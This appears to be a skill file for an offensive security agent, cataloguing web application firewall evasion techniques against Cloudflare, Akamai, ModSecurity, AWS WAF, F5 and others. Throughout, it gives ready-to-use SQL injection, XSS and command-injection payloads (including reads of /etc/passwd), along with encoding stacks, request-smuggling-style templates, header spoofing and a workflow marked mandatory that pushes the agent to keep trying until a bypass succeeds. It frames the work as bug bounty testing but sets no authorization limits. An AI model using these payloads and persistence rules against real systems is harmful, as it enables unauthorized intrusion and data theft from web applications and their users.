---
name: waf-generic-evasion
pattern: WAF Generic Evasion Techniques
description: "WAF bypass via case toggling, double/triple URL encoding, Unicode normalization, SQL comment injection, chunked transfer, HPP, charset abuse, body padding, and stacked encoding combos"
tech: [generic, cloudflare, akamai, modsecurity, imperva, aws-waf, f5]
triggers: ["/test-waf", "waf bypass", "waf evasion", "payload blocked", "403 bypass", "encoding bypass", "chunked transfer", "hpp bypass"]
related_patterns: ["waf-bypass-matrix", "command-injection-techniques", "ssti-techniques", "dom-based-vulnerabilities", "hidden-param-discovery"]
sources: ["awesome-waf", "portswigger-academy"]
severity: High
---

# WAF Generic Evasion Techniques

## Crown Jewel Targets

- **Enterprise apps behind Akamai Kona** -- hardest WAF but highest bounties. EXEC() wrapper + /**/ spacing bypasses for MSSQL stacked queries (target-corp DealerNet pattern)
- **PHP/Apache with ModSecurity CRS PL1** -- default paranoia level has many known bypasses. MySQL version comments (`/*!50000UNION*/`) pass consistently
- **Java/.NET backends behind reverse proxies** -- double URL encoding works when proxy decodes once and backend decodes again
- **Targets with both JSON and form-encoded endpoints** -- WAF may only inspect URL-encoded bodies; switching to `application/json` bypasses rules entirely
- **AWS WAF with default managed rules** -- 8KB body inspection limit. Body padding with 64KB+ junk data puts real payload past inspection window
- **Cloudflare free/pro plans** -- weaker rule sets than Enterprise. Mutation XSS and SVG+use patterns bypass standard XSS rules
- **IIS + F5 BIG-IP ASM** -- HPP (HTTP Parameter Pollution) is highly effective; ASM often inspects only one instance of duplicate parameters

## Attack Surface Signals

- **WAF detection**: `wafw00f https://TARGET` (fastest), check for `cf-ray`, `_abck`, `incap_ses`, `x-sucuri`, `x-amzn`, `BIGipServer` cookies/headers
- **Block indicators**: HTTP 403 with custom block page, `Reference #` (Akamai), `Ray ID` (Cloudflare), `support ID` (F5)
- **Body limit probe**: Send incrementally larger junk payloads (8KB, 16KB, 32KB, 64KB) -- payload passing after certain size = inspection limit found
- **Decode depth probe**: Send single-encoded, double-encoded, triple-encoded -- each passing = deeper decode pipeline

Reference for WAF-agnostic bypass techniques applicable across Cloudflare, Akamai, ModSecurity, Imperva, AWS WAF, F5, and others. Sourced from the Awesome-WAF project and real-world bug bounty engagements.

---

## 1. Case Toggling

Mixed-case keywords bypass regex rules that match exact case patterns.

```
sElEcT * fRoM users
uNiOn SeLeCt user,password FrOm users
```

**When to use**: First thing to try when WAF blocks SQL keywords. Many basic WAFs use case-sensitive regex.

---

## 2. URL Encoding (Single)

Standard percent-encoding to obfuscate characters.

```
%27           = '
%3C           = <
%3E           = >
%3C%73%63%72%69%70%74%3E = <script>
```

**When to use**: Baseline technique. If single encoding is decoded by the WAF before inspection, escalate to double encoding.

---

## 3. Double/Triple URL Encoding

Encode the `%` sign itself so the WAF sees encoded data but the backend decodes it twice.

```
%2527         decodes once to %27, decodes twice to '
%25253C       decodes once to %253C, twice to %3C, three times to <
```

**When to use**: When the backend performs multiple decode passes but the WAF only decodes once. Common in Java/.NET backends behind reverse proxies.

---

## 4. Unicode Normalization (Fullwidth Characters)

Fullwidth Unicode characters that normalize to their ASCII equivalents on the backend.

```
U+FF1C  (fullwidth <)  = <
U+FF1E  (fullwidth >)  = >
U+FF07  (fullwidth ')  = '

%EF%BC%87  = fullwidth '
%EF%BC%9C  = fullwidth <
%EF%BC%9E  = fullwidth >

Payload: ＜script＞alert(1)＜/script＞
```

**When to use**: Against WAFs that inspect raw bytes without Unicode normalization. Particularly effective against Cloudflare and AWS WAF when the backend runs .NET or Java (which normalize Unicode).

---

## 5. HTML Entity Encoding

Browsers decode HTML entities, but WAFs often inspect the raw request.

```
&#39;                                       = '
&lt;                                        = <
&gt;                                        = >
&#x61;&#x6C;&#x65;&#x72;&#x74;             = alert
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E; = <script>
```

**When to use**: For stored XSS where input is rendered in HTML context. The WAF sees entities, the browser renders them as executable code.

---

## 6. SQL Comment Injection

Inline comments break up SQL keywords that WAF regex patterns try to match.

```
un/**/ion sel/**/ect
/*!UNION*/ /*!SELECT*/
SELECT(*)FROM(users)
1'/**/OR/**/1=1--
```

MySQL-specific version comments execute only on certain versions:
```
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
```

**When to use**: Primary SQLi WAF bypass technique. Works against most regex-based WAFs. The `/*!...*/` syntax is MySQL-specific and frequently missed by WAF rules.

---

## 7. HTML Comment Splitting

HTML comments inside tags break pattern matching but browsers ignore them.

```html
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<im<!---->g src=x onerror=alert(1)>
```

**When to use**: When WAF blocks `<script>` as a whole token. Browser HTML parsers strip comments before execution.

---

## 8. Wildcard Obfuscation (OS Commands)

Shell globbing and wildcards to avoid matching command names.

```bash
/bin/c?t /etc/passwd          # ? matches any single char
/bin/ca* /etc/passwd          # * matches zero or more chars
cat /???/??ss??               # glob pattern for /etc/passwd
/bin/c\at /etc/passwd         # backslash between chars
```

**When to use**: Command injection scenarios where WAF blocks common command names like `cat`, `whoami`, `id`.

---

## 9. Uninitialized Bash Variables

Insert undefined variables that expand to empty strings, breaking keyword matching.

```bash
cat$u /etc/passwd             # $u is undefined = empty
/bin/c$u${v}at /etc/passwd
w$u${h}o$uami
```

**When to use**: Command injection when wildcard characters (`?`, `*`) are also blocked. Works in bash/sh environments.

---

## 10. Whitespace Substitution

Replace spaces with alternative whitespace characters that many parsers accept.

```
%09   = horizontal tab
%0a   = newline (LF)
%0b   = vertical tab
%0c   = form feed
%0d   = carriage return (CR)
%a0   = non-breaking space
%20   = standard space (for completeness)

Example: SELECT%09*%09FROM%09users
Example: SELECT%0auser%0aFROM%0ausers
```

**When to use**: When WAF blocks payloads containing spaces. SQL and many parsers accept tab/newline as valid whitespace.

---

## 11. Null Byte Injection

Null bytes can terminate string processing in C-based WAF engines.

```
%00<script>alert(1)</script>
file.php%00.jpg
param=value%00<payload>
```

**When to use**: Against older WAF implementations (C/C++ based) where null byte terminates string comparison. The backend language (PHP, Java) may continue processing past the null.

---

## 12. HTTP Parameter Pollution (HPP)

Duplicate parameters are handled differently by each platform. Send the same parameter twice with different values.

| Platform | Behavior |
|---|---|
| ASP.NET / IIS | Concatenates with comma: `val1,val2` |
| PHP / Apache | Uses **LAST** value |
| JSP / Tomcat | Uses **FIRST** value |
| Python Django | Uses **LAST** value |
| Node.js / Express | Uses **FIRST** value (or returns array) |

**Attack pattern**:
```
?param=legit&param=<malicious_payload>
```

The WAF inspects the first (or concatenated) value, but the backend uses the last (or first), depending on stack.

**When to use**: When you know the backend stack and the WAF inspects a different parameter instance than the one the application processes.

---

## 13. HTTP Parameter Fragmentation

Split a single payload across multiple parameters that the application concatenates server-side.

```
?a=uni&b=on+sel&c=ect+1,2,3
```

If the backend concatenates: `a + b + c` = `union select 1,2,3`

**When to use**: When the application builds queries or commands from multiple parameters. Requires knowledge of server-side concatenation logic.

---

## 14. Chunked Transfer Encoding

Split the request body into small chunks so the WAF cannot match the full payload signature in any single chunk.

```http
POST /target HTTP/1.1
Transfer-Encoding: chunked

4
unio
7
n selec
6
t 1,2,
1
3
0

```

**When to use**: Against WAFs that inspect the body as a contiguous buffer and do not reassemble chunks. Test by sending a normal blocked payload in chunked form.

---

## 15. HTTP/2 Pseudo-header Tricks

Some WAFs only inspect the HTTP/1.1 translation of HTTP/2 requests, missing payloads in binary frames.

```
:method: GET
:path: /search?q=<script>alert(1)</script>
:authority: target.com
```

HTTP/2 header names are case-sensitive and binary-framed. Some WAFs fail to parse them correctly.

**When to use**: When the target supports HTTP/2 and the WAF sits as a reverse proxy doing HTTP/2-to-HTTP/1.1 translation. Use Burp Repeater with HTTP/2 mode enabled.

---

## 16. Content-Type Charset Abuse

Declare an exotic charset so the WAF reads raw bytes but the backend decodes them.

```http
Content-Type: application/x-www-form-urlencoded; charset=IBM037
Content-Type: application/x-www-form-urlencoded; charset=UTF-16
Content-Type: application/x-www-form-urlencoded; charset=EBCDIC
```

The body is encoded in the declared charset. The WAF inspects raw bytes (sees gibberish), the backend decodes per the charset header.

**When to use**: Against WAFs that do not honor the Content-Type charset when inspecting body content. IBM037/EBCDIC is particularly effective against Akamai and some ModSecurity configurations.

---

## 17. Body Size Padding

Prepend junk data that exceeds the WAF's inspection buffer limit. Many WAFs only inspect the first N kilobytes.

```http
POST /target HTTP/1.1
Content-Type: application/x-www-form-urlencoded

junk=AAAA....(repeat to 64KB+)....AAAA&real_param=<malicious_payload>
```

Common WAF inspection limits: 8KB (AWS WAF default), 16KB, 32KB, 64KB.

**When to use**: When you suspect the WAF has a body inspection size limit. Gradually increase padding size until the payload passes through.

---

## 18. Junk Parameter Dilution

Add many noise parameters to dilute the payload below the WAF's detection threshold or exhaust its parsing budget.

```
?j1=aaa&j2=bbb&j3=ccc&...&j200=zzz&real_param=<payload>
```

**When to use**: Against WAFs with parameter count limits or processing budgets. Also useful when combined with HPP.

---

## 19. Request Header Spoofing (Source IP)

Spoof origin headers to appear as internal/trusted traffic that some WAFs whitelist.

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

**When to use**: When WAF rate-limits or applies stricter rules to external IPs. Also try internal RFC1918 ranges: `10.0.0.1`, `172.16.0.1`, `192.168.1.1`.

---

## 20. Dynamic Payload Construction (JavaScript)

Build XSS payloads at runtime using string manipulation so the literal keyword never appears in the request.

```javascript
window['al'+'ert'](1)
self[atob('YWxlcnQ=')](1)                     // base64 for 'alert'
eval(String.fromCharCode(97,108,101,114,116,40,49,41))  // alert(1)
setTimeout('ale'+'rt(1)',0)
Function('ale'+'rt(1)')()
[].constructor.constructor('alert(1)')()
```

**When to use**: When the WAF blocks `alert`, `prompt`, `confirm` as keywords. These constructions execute the same function without the literal string appearing in the request.

---

## 21. SQL Function Alternatives

When specific SQL functions are blocked, substitute equivalent functions.

| Blocked Function | Alternative |
|---|---|
| `substr()` | `lpad()`, `rpad()`, `mid()`, `left()`, `right()` |
| `hex()` | `conv(value, 10, 16)` |
| `concat()` | `group_concat()`, `concat_ws()` |
| `ascii()` | `ord()` |
| `benchmark()` | `sleep()` |
| `if()` | `case when ... then ... else ... end` |
| `char()` | `chr()` (PostgreSQL) |
| `length()` | `char_length()`, `octet_length()` |

**When to use**: During blind SQLi extraction when the WAF blocks specific functions. Test each alternative to find which ones pass through.

---

## 22. Scientific Notation (SQL)

Use scientific notation in SQL to bypass numeric and keyword filters.

```sql
' OR 1e0=1e0--
' AND 3>-1#
' OR 1.e1=10--
0e0 UNION SELECT 1,2,3
```

**When to use**: When the WAF blocks `1=1`, `OR 1`, `AND 1`. Scientific notation evaluates to the same truth value but looks different to pattern matchers.

---

## 23. JSON-Inline SQL (Body Type Switch)

Switch the Content-Type to `application/json` and embed SQL injection in JSON values. Many WAFs only inspect URL-encoded bodies.

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"id":"1' UNION SELECT 1,2,3--"}
{"search":"test' OR '1'='1"}
```

**When to use**: When the endpoint accepts both `application/x-www-form-urlencoded` and `application/json`. The WAF may have different rule sets (or none) for JSON bodies.

---

## 24. Multipart Form Bypass

Wrap the payload in `multipart/form-data` boundary format when the endpoint also accepts URL-encoded data.

```http
POST /target HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="param"

<malicious_payload>
------WebKitFormBoundary--
```

**When to use**: When the WAF inspects URL-encoded bodies but not multipart bodies. Many WAFs have weaker multipart parsing. Also try boundary manipulation (extra hyphens, whitespace, mixed case).

---

## 25. Regex Blacklist Reversal (Iterative)

Systematic step-by-step approach to defeat regex-based WAF rules by testing which keywords are blocked and substituting alternatives.

**Progression table**:

| Step | If Blocked | Substitute With |
|---|---|---|
| 1 | `and`, `or`, `union` | `\|\|` operator + subquery |
| 2 | + `where` | `LIMIT` clause |
| 3 | + `limit` | `GROUP BY ... HAVING` |
| 4 | + `select` | `INTO OUTFILE` |
| 5 | + `'` (single quote) | Hex encoding: `0x61646D696E` |
| 6 | + `hex` | `lower(conv(11,10,36))` = `'b'` |
| 7 | + `substr` | `lpad(user(),7,1)` |
| 8 | + whitespace | `%0b` (vertical tab) |

**Process**:
1. Send baseline payload, note which part gets blocked
2. Replace the blocked keyword with an alternative from the table
3. Resend, note next block
4. Repeat until the full payload passes through
5. Document each substitution for the report

**When to use**: As a last resort when individual techniques fail. This iterative approach works against any regex-based WAF if enough alternatives exist.

---

## Quick Decision Matrix

| WAF Behavior | Technique to Try First |
|---|---|
| Blocks keywords (UNION, SELECT) | Case toggling (#1) + Comment injection (#6) |
| Blocks encoding (`<`, `>`) | Double URL encoding (#3) + Unicode fullwidth (#4) |
| Rate limits requests | Header spoofing (#19) + slow Burp Repeater |
| Blocks automated tools | Playwright + browser TLS fingerprint |
| Checks only first parameter | HPP - send duplicate params (#12) |
| Inspects only body < 8KB | Body size padding (#17) |
| HTTP/1.1 only inspection | HTTP/2 pseudo-headers (#15) |
| Regex-based rules | Iterative regex reversal (#25) |

---

## Stacked Encoding (MANDATORY before declaring "WAF blocks everything")

Most WAFs decode only 1-2 layers. Stacking 3+ encoding types in a single payload bypasses the decode pipeline.

### Combo Patterns

| # | Stack | Decode Path | XSS Example | SQLi Example |
|---|-------|-------------|-------------|--------------|
| 1 | URL + Unicode | Server URL-decodes → app Unicode-normalizes | `%3Csvg%20onload%3D%u0061lert(1)%3E` | `%27%20OR%20%u0031%3D%u0031--` |
| 2 | Double-URL + HTML-entity | Proxy URL-decodes layer 1 → app URL-decodes layer 2 → browser HTML-decodes | `%253Cimg%2520src%253Dx%2520onerror%253D%2526%252397lert(1)%253E` | `%2527%2520UNION%2520SELECT%2520%26%2335%3B49%3B--` |
| 3 | HTML-entity + URL + Case-toggle | Browser HTML-decodes → app URL-decodes → case-insensitive match misses | `&#60;ScRiPt&#62;%61%6c%45%72%74(1)&#60;/sCrIpT&#62;` | `&#39; oR %31=%31--` |
| 4 | Unicode fullwidth + URL | App normalizes fullwidth → WAF sees clean → URL-decoded payload executes | `＜script＞%61lert(1)＜/script＞` | `＇ %4F%52 1=1--` |
| 5 | Hex + Comment-split + Case | Concat hex characters, split SQL keywords with comments, toggle case | N/A | `0x27%20O/**/R%201%3d1%2d%2d` |

### Rules

- **ALWAYS try stacked encoding before declaring WAF bypass impossible**
- Test at minimum combos #1, #2, #3 per endpoint
- If WAF decodes 2 layers: add a 3rd (triple-URL or hex+url+unicode)
- Log each combo attempt in `test-log.jsonl` with `"encoding": "stacked-url+unicode"` etc.

---

## Testing Workflow

1. **Identify WAF**: Check response headers (`Server`, `X-Powered-By`), error pages, and `wafw00f` fingerprinting
2. **Baseline**: Send a known-blocked payload to confirm WAF is active
3. **Start simple**: Case toggling and single URL encoding
4. **Escalate**: Double encoding, Unicode, comment injection
5. **Stacked encoding**: Apply combo patterns #1-#5 above — MANDATORY step
6. **Protocol-level**: HPP, chunked transfer, HTTP/2, charset abuse
7. **Body tricks**: Size padding, junk params, multipart switch
8. **Iterative reversal**: If all else fails, walk through technique #25
9. **Document everything**: Record which technique bypassed which rule for the report

## Operator Notes (Battle-Tested)

1. **ALWAYS try stacked encoding before declaring bypass impossible (MANDATORY step)** -- single technique rarely works on enterprise WAFs. Combo #1 (URL+Unicode), #2 (double-URL+HTML-entity), #3 (HTML+URL+case-toggle) must ALL be tested before concluding WAF is unbeatable.
2. **Fingerprint WAF first with wafw00f** -- `wafw00f https://TARGET` takes 1-2 requests. Knowing the exact WAF lets you skip to the right bypass technique immediately. Then check `waf-bypass-matrix` for per-WAF specific bypasses.
3. **IBM037/EBCDIC charset abuse is the most underused technique** -- `Content-Type: application/x-www-form-urlencoded; charset=IBM037` encodes the body in EBCDIC. The WAF sees gibberish, the backend (Java/.NET) decodes per charset header. Effective against Akamai and ModSecurity.
4. **Body size padding bypasses AWS WAF** -- AWS WAF default inspection limit is 8KB. Prepend `junk=AAAA...(8KB)...&real_param=payload`. Gradually increase from 8KB to 64KB to find the exact limit. Works more often than encoding tricks.
5. **Multipart form-data is the forgotten bypass** -- when WAF blocks URL-encoded payloads, wrap the same payload in `multipart/form-data` boundary format. Many WAFs have weaker multipart parsing. Also manipulate boundary strings (extra hyphens, whitespace, mixed case).

## Related Skills & Chains

| When | Go to |
|------|-------|
| Need per-WAF specific bypasses | `waf-bypass-matrix` |
| WAF blocks OS command keywords | `command-injection-techniques` |
| WAF blocks template syntax | `ssti-techniques` |
| Use DOM-based payload (WAF cannot inspect fragments) | `dom-based-vulnerabilities` |
| Hidden params bypass WAF rules for known params | `hidden-param-discovery` |
